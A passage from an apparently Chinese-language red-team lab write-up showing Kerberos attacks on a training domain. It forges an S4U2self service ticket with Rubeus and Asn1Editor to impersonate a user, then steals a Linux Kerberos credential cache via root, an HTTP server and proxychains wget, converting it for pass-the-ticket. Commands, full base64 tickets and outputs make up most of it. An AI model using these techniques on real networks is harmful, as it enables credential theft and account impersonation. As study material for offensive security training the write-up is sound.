5i2zcKDs6Vkc/415ZWLI6tkIe8sEG7VPE4LzCxaf2dkLJcqYqvmfch5NwFTHbqSt7xv5EbNAPKrH5KLFoXR5/TnqpoyLi7ImCICnKy30WaKDTUUh64W1BdgsBC5c1XXZehDQ0C/ML09EjQKiTrdI21cG7YLhBFW9Se6sgmPC/T7RZ+jktFE16jXEUmUJtTWvPbc8QGDX+LCMIv+HsCk7UqcUGNrlXCG4b69mztdqaEw/spGjTOoSJOnk59mKg3iby6l0xbDvoYProAcbYM5YSJ80WJfZE/Q3g/80qnkskk6eXXvCSsOU0QnJCV76BSfKUKsg4hZyp6ugN8Q8Qu9TLCOZjBt92p+ZmXTXNYoAc7pIN6mXacOt6I939DXk/7Hv7v2byPV0ywfkNgF6hvF88DhhBWjAb4o+AWtBITmawaaf5FaNtyZeBdgI3XJVS7aOKk36XZlndjXhErsos+2neaCdMpCJR6HkQcj85UklrU/wH14YZkqTXl6sVPHym59SC4T5WBo2Z5/LO4FSGoUEV+m1mfGax8NQPMZHWwE+GCuaGAyrKOB9TCB8qADAgEAooHqBIHnfYHkMIHhoIHeMIHbMIHYoCswKaADAgESoSIEIMiY1PN7UbC6/uNHX6H9BoAwtbkNXv5mVALvZTf1lzZ9oRMbEURFVi5DWUJFUkJPVElDLklPohUwE6ADAgEBoQwwChsIV0tTVE4tMiSjBwMFAGAhAAClERgPMjAyMjA4MTQwODAzMjFaphEYDzIwMjIwODE0MTgwMzIxWqcRGA8xOTcwMDEwMTAwMDAwMFqoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP
+
+[*] Ticket cache size: 6
+
+```
+
+
+4. 制作成WKSTN-2的ticket
+
+```
+[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\wkstn-2-tgt.kirbi" , [System.Convert]::FromBase64String( "doIFLTCCBSmgAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9EwggPNoAMCARKhAwIBAqKCA78EggO7+zYro9081g7t0z+jHT422umcZe8wpsnYp7RO0Gbtq3V8asQ4Kzv0gDvJC4Q95l3OsrX4iiP+5FbbrFtJP36aUyC5BGIQpjW4P1OqLcz+OCQmujUbtLjIz28mlt15+7Li6WHJ+jySPUQV7qGFtH5I2Rl0cV2XONN0cFqf/pueM/pWifjWKIENoUaiOtHVQyALXk4fK7qA0HzRjY7SOI1mat/MxRZKgbl1NARfdgHpVW3zbRD6PcrsaBCju7TLd55AbrtVB4auvfLR6Y/Yx99N31MUh61yzcBgUF5xkndkiMJaQyxdecjXRWmUeDz/yBmo8lQfrgGqDOcvgMYe337XZmM5eRj2JHkUzTeJ7CXEv9OBHVgSIYr0EDMjxWv3Hx/kBs2e2XMgxsTCpoPuqqnz9SUK2vebQ9dZ/7nfMnnOAU9HRJGjWUXLhHrbp7SH84DvKSqeuZjunqGsCqUzb3cTeDZmfwfHZECn6TC98Jvqzz3TfxvLIqhbdV1UYtmJLoAGFi21ScfTybC6GpR0MsA+wsivBb/gV6rqVl8jkDZI8qnK+PobmQRY5NIwALOWkoBWmkUdbVQN8LV3rwWibwKwKnBBwk90vOp0ZSrCuS+HeY+x2NEg+gbgDqp6KbmwO9RfodrbcQD1wVjJaZ7ISxU0BJ1GCOioDiCKdEaAZ3oYHJ/MBKF/p4Mt4aY6juabpwh14sGpZYb7G5i2zcKDs6Vkc/415ZWLI6tkIe8sEG7VPE4LzCxaf2dkLJcqYqvmfch5NwFTHbqSt7xv5EbNAPKrH5KLFoXR5/TnqpoyLi7ImCICnKy30WaKDTUUh64W1BdgsBC5c1XXZehDQ0C/ML09EjQKiTrdI21cG7YLhBFW9Se6sgmPC/T7RZ+jktFE16jXEUmUJtTWvPbc8QGDX+LCMIv+HsCk7UqcUGNrlXCG4b69mztdqaEw/spGjTOoSJOnk59mKg3iby6l0xbDvoYProAcbYM5YSJ80WJfZE/Q3g/80qnkskk6eXXvCSsOU0QnJCV76BSfKUKsg4hZyp6ugN8Q8Qu9TLCOZjBt92p+ZmXTXNYoAc7pIN6mXacOt6I939DXk/7Hv7v2byPV0ywfkNgF6hvF88DhhBWjAb4o+AWtBITmawaaf5FaNtyZeBdgI3XJVS7aOKk36XZlndjXhErsos+2neaCdMpCJR6HkQcj85UklrU/wH14YZkqTXl6sVPHym59SC4T5WBo2Z5/LO4FSGoUEV+m1mfGax8NQPMZHWwE+GCuaGAyrKOB9TCB8qADAgEAooHqBIHnfYHkMIHhoIHeMIHbMIHYoCswKaADAgESoSIEIMiY1PN7UbC6/uNHX6H9BoAwtbkNXv5mVALvZTf1lzZ9oRMbEURFVi5DWUJFUkJPVElDLklPohUwE6ADAgEBoQwwChsIV0tTVE4tMiSjBwMFAGAhAAClERgPMjAyMjA4MTQwODAzMjFaphEYDzIwMjIwODE0MTgwMzIxWqcRGA8xOTcwMDEwMTAwMDAwMFqoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP"))
+```
+
+5. 导入ticket，尝试访问
+
+访问失败
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660464491655.png)
+
+
+
+6. 利用WKSTN-2的tgt，假冒nlmb用户申请一张```cifs/wkstn-2.dev.cyberbotic.io```的tgs
+
+```
+ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /user:WKSTN-2$ /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /impersonateuser:nlamb /ticket:doIFLTCCBSmgAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9EwggPNoAMCARKhAwIBAqKCA78EggO7+zYro9081g7t0z+jHT422umcZe8wpsnYp7RO0Gbtq3V8asQ4Kzv0gDvJC4Q95l3OsrX4iiP+5FbbrFtJP36aUyC5BGIQpjW4P1OqLcz+OCQmujUbtLjIz28mlt15+7Li6WHJ+jySPUQV7qGFtH5I2Rl0cV2XONN0cFqf/pueM/pWifjWKIENoUaiOtHVQyALXk4fK7qA0HzRjY7SOI1mat/MxRZKgbl1NARfdgHpVW3zbRD6PcrsaBCju7TLd55AbrtVB4auvfLR6Y/Yx99N31MUh61yzcBgUF5xkndkiMJaQyxdecjXRWmUeDz/yBmo8lQfrgGqDOcvgMYe337XZmM5eRj2JHkUzTeJ7CXEv9OBHVgSIYr0EDMjxWv3Hx/kBs2e2XMgxsTCpoPuqqnz9SUK2vebQ9dZ/7nfMnnOAU9HRJGjWUXLhHrbp7SH84DvKSqeuZjunqGsCqUzb3cTeDZmfwfHZECn6TC98Jvqzz3TfxvLIqhbdV1UYtmJLoAGFi21ScfTybC6GpR0MsA+wsivBb/gV6rqVl8jkDZI8qnK+PobmQRY5NIwALOWkoBWmkUdbVQN8LV3rwWibwKwKnBBwk90vOp0ZSrCuS+HeY+x2NEg+gbgDqp6KbmwO9RfodrbcQD1wVjJaZ7ISxU0BJ1GCOioDiCKdEaAZ3oYHJ/MBKF/p4Mt4aY6juabpwh14sGpZYb7G5i2zcKDs6Vkc/415ZWLI6tkIe8sEG7VPE4LzCxaf2dkLJcqYqvmfch5NwFTHbqSt7xv5EbNAPKrH5KLFoXR5/TnqpoyLi7ImCICnKy30WaKDTUUh64W1BdgsBC5c1XXZehDQ0C/ML09EjQKiTrdI21cG7YLhBFW9Se6sgmPC/T7RZ+jktFE16jXEUmUJtTWvPbc8QGDX+LCMIv+HsCk7UqcUGNrlXCG4b69mztdqaEw/spGjTOoSJOnk59mKg3iby6l0xbDvoYProAcbYM5YSJ80WJfZE/Q3g/80qnkskk6eXXvCSsOU0QnJCV76BSfKUKsg4hZyp6ugN8Q8Qu9TLCOZjBt92p+ZmXTXNYoAc7pIN6mXacOt6I939DXk/7Hv7v2byPV0ywfkNgF6hvF88DhhBWjAb4o+AWtBITmawaaf5FaNtyZeBdgI3XJVS7aOKk36XZlndjXhErsos+2neaCdMpCJR6HkQcj85UklrU/wH14YZkqTXl6sVPHym59SC4T5WBo2Z5/LO4FSGoUEV+m1mfGax8NQPMZHWwE+GCuaGAyrKOB9TCB8qADAgEAooHqBIHnfYHkMIHhoIHeMIHbMIHYoCswKaADAgESoSIEIMiY1PN7UbC6/uNHX6H9BoAwtbkNXv5mVALvZTf1lzZ9oRMbEURFVi5DWUJFUkJPVElDLklPohUwE6ADAgEBoQwwChsIV0tTVE4tMiSjBwMFAGAhAAClERgPMjAyMjA4MTQwODAzMjFaphEYDzIwMjIwODE0MTgwMzIxWqcRGA8xOTcwMDEwMTAwMDAwMFqoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP /nowrap
+```
+
+
+ 
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660464594234.png)
+
+```
+ [+] received output:
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'WKSTN-2$@DEV.CYBERBOTIC.IO'
+
+[+] received output:
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
+[*] Sending S4U2self request to 10.10.17.71:88
+[+] S4U2self success!
+[*] Got a TGS for 'nlamb' to 'WKSTN-2$@DEV.CYBERBOTIC.IO'
+[*] base64(ticket.kirbi):
+
+      doIFgjCCBX6gAwIBBaEDAgEWooIEnzCCBJthggSXMIIEk6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPohUwE6ADAgEBoQwwChsIV0tTVE4tMiSjggReMIIEWqADAgESoQMCAQWiggRMBIIESACUvhQahq7V+FrY8kAQNcZQPRgFBFyjvAXKw2kox5vt+QMYPujGu2r6SkoP5T5kuOsUeMeyrcRZAobnvPoorjg1TMROPGl8dW5ycNud7C7UKEdc5AFf5gxgarm7b3eIJwNTB3P6Vc1EtJ3ZdYcxyNNyfWs52skdVwPujdPGKR/r5MU0+lXNSv3d5T9dwkHzP6S1Q6nLXffmYk/p8X1dZj5p85vtsxtf+Cy2k+gsOfEnXbc5NgBphlO+lRSxIqmvbZp3OKTdXszNRjEVPK+CgzZnVWGig8GdnoJe4F/h1LiXJx4+EWE07t/jvMlt0UKWKc8jdptq1BOePf1Cwlanxo1Q2YkNBarTNzQyT7G0HaedpA7Yt0t9bfvM6P33LtwpeimOVbjnF35DcH0wrJDpQkPh2OoXKtI3dhYo79L8d1FnpQ2PbBwIA1roi0hrT0meKFq8NUTWwLSuCO0wv2nBaxTSdIq2wD5F4cqEENPJn0IZqmVXsvumPojnfooR6QL3194s9MPhnG3eplji0Ag7sKfVABBjs6b2ivBGkYgNYYRB1hkaGLGr+BiiHA1W6rpRUo2+2gvcb1thhcRKBjPiUV7zWICMApqjfb8TFhm45XanWTjp1lj/z48UV6OO0p5fSImSgDLKarswNykl3IhfWAKANpO6O+JuY4s/NfmGUZtbQ/X6M2WIXZuCPFAVDAd1TRI6HphDlBC1MQNhZHrEhPscYXeDz5V3SzU6ZS7+Ce3CPoHeiGcNHcrhQYVDzuD8uBTFb2tCPcBd4/vaSRD+t00DDBLAqWPe57Ax+6q6Eax9Jrs/GZZ/jOy2H6pyQAom4Cd95toS1sQfNXn4PHRy14Jsle7fY/AFXcDZV6gSEJeyfOqhWMsF6IXOW7ZXUuxPKWAsvLd3Uq7bQc3sO1m1p3HeuYegUTMevYwq1Ag/tz8OnEEnFt8yY2WIh5gNsZ6BZVfGCVANxfM+/6VeyqachcJd4BsmpA1nLeCSznlKfXYVgg/XXT0E2+TnxhIu4aF4vwBaM5XA44GNIFFT1qYocWocY5d6tNmMiCUsWwvoBHDbdNoroSisdKO+em9WZxSSPBN9HBB5h6B1dfoSGf51zQVFVL05wcl7TgzPq5jyjDt6AkkXAZiww9mIv8cvYiaIBI8TdhD5u4UeDWPsAKnwjOkWrwAm7FEWCeA4H+M7qu0RXFFtTamvpYs3utoFS1KuCOlNYXgsxo+nr0mI8YgNWkBJU4pL++kzWe3Ahtr/VVkqJu1CWZby2gfuhXNEzwA7x2TFEkKpdMfEA37N5VOc/fvfbkuDUnGw2eL7DfR1177JF5sohKRLHS8FloTAAia4s3jiyxYPAsZKzE1JaOLq+zMlWH4UNGrDloO2E4lHPU7RgdF2UszxcGJySILCEVtvdjauF/XpQ1Td8yInuCmIJO2l39olU7LaX82vHNK2Qrw5+sN/Abjb0E2jgc4wgcugAwIBAKKBwwSBwH2BvTCBuqCBtzCBtDCBsaArMCmgAwIBEqEiBCD+Qw14qjdk0xArNHYHCx76YL3+Yg1ak2Ccm5eWLVYOX6ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBCqEJMAcbBW5sYW1iowcDBQBgIQAApREYDzIwMjIwODE0MDgwOTM0WqYRGA8yMDIyMDgxNDE4MDMyMVqoExsRREVWLkNZQkVSQk9USUMuSU+pFTAToAMCAQGhDDAKGwhXS1NUTi0yJA==
+
+[*] Impersonating user 'nlamb' to target SPN 'cifs/wkstn-2.dev.cyberbotic.io'
+[*] Building S4U2proxy request for service: 'cifs/wkstn-2.dev.cyberbotic.io'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
+[*] Sending S4U2proxy request to domain controller 10.10.17.71:88
+
+[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
+
+
+```
+
+可见s4u2proxy这一步失败了（KRB-ERROR (13) : KDC_ERR_BADOPTION），但是没有关系
+
+
+制作一张wkstn-2-s4u.kirbi
+```
+[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi", [System.Convert]::FromBase64String("doIFgjCCBX6gAwIBBaEDAgEWooIEnzCCBJthggSXMIIEk6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPohUwE6ADAgEBoQwwChsIV0tTVE4tMiSjggReMIIEWqADAgESoQMCAQWiggRMBIIESACUvhQahq7V+FrY8kAQNcZQPRgFBFyjvAXKw2kox5vt+QMYPujGu2r6SkoP5T5kuOsUeMeyrcRZAobnvPoorjg1TMROPGl8dW5ycNud7C7UKEdc5AFf5gxgarm7b3eIJwNTB3P6Vc1EtJ3ZdYcxyNNyfWs52skdVwPujdPGKR/r5MU0+lXNSv3d5T9dwkHzP6S1Q6nLXffmYk/p8X1dZj5p85vtsxtf+Cy2k+gsOfEnXbc5NgBphlO+lRSxIqmvbZp3OKTdXszNRjEVPK+CgzZnVWGig8GdnoJe4F/h1LiXJx4+EWE07t/jvMlt0UKWKc8jdptq1BOePf1Cwlanxo1Q2YkNBarTNzQyT7G0HaedpA7Yt0t9bfvM6P33LtwpeimOVbjnF35DcH0wrJDpQkPh2OoXKtI3dhYo79L8d1FnpQ2PbBwIA1roi0hrT0meKFq8NUTWwLSuCO0wv2nBaxTSdIq2wD5F4cqEENPJn0IZqmVXsvumPojnfooR6QL3194s9MPhnG3eplji0Ag7sKfVABBjs6b2ivBGkYgNYYRB1hkaGLGr+BiiHA1W6rpRUo2+2gvcb1thhcRKBjPiUV7zWICMApqjfb8TFhm45XanWTjp1lj/z48UV6OO0p5fSImSgDLKarswNykl3IhfWAKANpO6O+JuY4s/NfmGUZtbQ/X6M2WIXZuCPFAVDAd1TRI6HphDlBC1MQNhZHrEhPscYXeDz5V3SzU6ZS7+Ce3CPoHeiGcNHcrhQYVDzuD8uBTFb2tCPcBd4/vaSRD+t00DDBLAqWPe57Ax+6q6Eax9Jrs/GZZ/jOy2H6pyQAom4Cd95toS1sQfNXn4PHRy14Jsle7fY/AFXcDZV6gSEJeyfOqhWMsF6IXOW7ZXUuxPKWAsvLd3Uq7bQc3sO1m1p3HeuYegUTMevYwq1Ag/tz8OnEEnFt8yY2WIh5gNsZ6BZVfGCVANxfM+/6VeyqachcJd4BsmpA1nLeCSznlKfXYVgg/XXT0E2+TnxhIu4aF4vwBaM5XA44GNIFFT1qYocWocY5d6tNmMiCUsWwvoBHDbdNoroSisdKO+em9WZxSSPBN9HBB5h6B1dfoSGf51zQVFVL05wcl7TgzPq5jyjDt6AkkXAZiww9mIv8cvYiaIBI8TdhD5u4UeDWPsAKnwjOkWrwAm7FEWCeA4H+M7qu0RXFFtTamvpYs3utoFS1KuCOlNYXgsxo+nr0mI8YgNWkBJU4pL++kzWe3Ahtr/VVkqJu1CWZby2gfuhXNEzwA7x2TFEkKpdMfEA37N5VOc/fvfbkuDUnGw2eL7DfR1177JF5sohKRLHS8FloTAAia4s3jiyxYPAsZKzE1JaOLq+zMlWH4UNGrDloO2E4lHPU7RgdF2UszxcGJySILCEVtvdjauF/XpQ1Td8yInuCmIJO2l39olU7LaX82vHNK2Qrw5+sN/Abjb0E2jgc4wgcugAwIBAKKBwwSBwH2BvTCBuqCBtzCBtDCBsaArMCmgAwIBEqEiBCD+Qw14qjdk0xArNHYHCx76YL3+Yg1ak2Ccm5eWLVYOX6ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBCqEJMAcbBW5sYW1iowcDBQBgIQAApREYDzIwMjIwODE0MDgwOTM0WqYRGA8yMDIyMDgxNDE4MDMyMVqoExsRREVWLkNZQkVSQk9USUMuSU+pFTAToAMCAQGhDDAKGwhXS1NUTi0yJA=="))
+```
+
+
+查看这张ticket的描述
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465090520.png)
+
+```
+PS C:\Tools\Rubeus\Rubeus\bin\Debug> .\Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.1
+
+
+[*] Action: Describe Ticket
+
+
+  ServiceName              :  WKSTN-2$
+  ServiceRealm             :  DEV.CYBERBOTIC.IO
+  UserName                 :  nlamb
+  UserRealm                :  DEV.CYBERBOTIC.IO
+  StartTime                :  8/14/2022 8:09:34 AM
+  EndTime                  :  8/14/2022 6:03:21 PM
+  RenewTill                :  1/1/0001 12:00:00 AM
+  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  /kMNeKo3ZNMQKzR2Bwse+mC9/mINWpNgnJuXli1WDl8=
+[!] AES256 in use but no '/serviceuser' passed, unable to generate crackable hash.
+
+```
+
+留意现在的ServiceName是 WKSTN-2$
+
+## 利用Asn1Editor修改tgs的ServiceName
+
+打开Asn1Editor
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465223854.png)
+
+
+选择上面的wkstn-2-s4u.kirbi票据
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465318554.png)
+
+
+选择第1个```GENERAL STRING```，双击修改它的值为cifs
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465485113.png)
+
+往上一级，新建一个条目，
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465540679.png)
+
+编辑内容
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465703096.png)
+
+
+选择第2个```GENERAL STRING```，双击修改它的值为cifs
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465837786.png)
+
+新建，编辑内容
+
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465923328.png)
+
+编辑完记得保存
+
+
+现在再次运行rebuse查看ServiceName已经变成cifs/wkstn-2.dev.cyberbotic.io
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660466024093.png)
+
+```
+PS C:\Tools\Rubeus\Rubeus\bin\Debug> .\Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.1
+
+
+[*] Action: Describe Ticket
+
+
+  ServiceName              :  cifs/wkstn-2.dev.cyberbotic.io
+  ServiceRealm             :  DEV.CYBERBOTIC.IO
+  UserName                 :  nlamb
+  UserRealm                :  DEV.CYBERBOTIC.IO
+  StartTime                :  8/14/2022 8:09:34 AM
+  EndTime                  :  8/14/2022 6:03:21 PM
+  RenewTill                :  1/1/0001 12:00:00 AM
+  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  /kMNeKo3ZNMQKzR2Bwse+mC9/mINWpNgnJuXli1WDl8=
+[!] AES256 in use but no '/serviceuser' passed, unable to generate crackable hash.
+```
+
+
+
+在wkstn-1操作
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660466188920.png)
+
+# Linux Credential Cache
+
+这里主要假设nix-1这台linux机器上有jking的ccache（可以理解为经过了身份验证的缓存）
+
+通过把这个ccache转成CS可使用的票据，利用这个用户的身份执行ptt操作
+
+
+linux的ccache存储在/tmp目录，文件只可以被root或者用户本身读取
+```
+svc_oracle@nix-1:~$ ls -l /tmp/
+total 20
+-rw------- 1 jking      domain users 1350 Aug 14 08:47 krb5cc_1394201122_WNr0Zn
+-rw------- 1 svc_oracle domain users 1341 Aug 14 08:51 krb5cc_1394201127_yuBrgE
+drwx------ 3 root       root         4096 Aug 14 07:44 snap.lxd
+drwx------ 3 root       root         4096 Aug 14 07:44 systemd-private-51f2f16cf1174fd5997e068447edc84c-systemd-logind.service-x27KBf
+drwx------ 3 root       root         4096 Aug 14 07:42 systemd-private-51f2f16cf1174fd5997e068447edc84c-systemd-timesyncd.service-Jix3Wi
+```
+
+提权到root
+```
+svc_oracle@nix-1:~$ sudo -l
+[sudo] password for svc_oracle: 
+Matching Defaults entries for svc_oracle on nix-1:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User svc_oracle may run the following commands on nix-1:
+    (ALL) ALL
+svc_oracle@nix-1:~$ sudo su
+root@nix-1:/home/svc_oracle@dev.cyberbotic.io# 
+```
+
+开启一个80服务，传文件
+```
+root@nix-1:/tmp# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+攻击机kali获取文件
+```
+root@kali:/opt/cobaltstrike/downloads# proxychains wget http://10.10.17.12/krb5cc_1394201122_WNr0Zn
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+--2022-08-14 09:18:04--  http://10.10.17.12/krb5cc_1394201122_WNr0Zn
+Connecting to 10.10.17.12:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.17.12:80  ...  OK
+connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1350 (1.3K) [application/octet-stream]
+Saving to: ??krb5cc_1394201122_WNr0Zn??
+
+krb5cc_1394201122_WNr0Zn                  100%[==================================================================================>]   1.32K  --.-KB/s    in 0s      
+
+2022-08-14 09:18:04 (157 MB/s) - ??krb5cc_1394201122_WNr0Zn?? saved [1350/1350]
+
+```
+
+
+用impacket-ticketConverter把linux的票据转换成CS可以识别的票据
+```
+root@kali:/opt/cobaltstrike/downloads# impacket-ticketConverter krb5cc_1394201122_WNr0Zn jking.kirbi
+Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation
+
+[*] converting ccache to kirbi...
+[+] done
+root@kali:/opt/cobaltstrike/downloads# ls
+ce0198041  jking.kirbi  krb5cc_1394201122_WNr0Zn
+```
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660468802360.png)
+
+
+把票据传回windows攻击机
+```
+certutil -urlcache -split -f "http://10.10.5.120:8000/jking.kirbi" jking.kirbi
+```
+
+
+导入票据，现在可以访问srv-2
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660469108850.png)
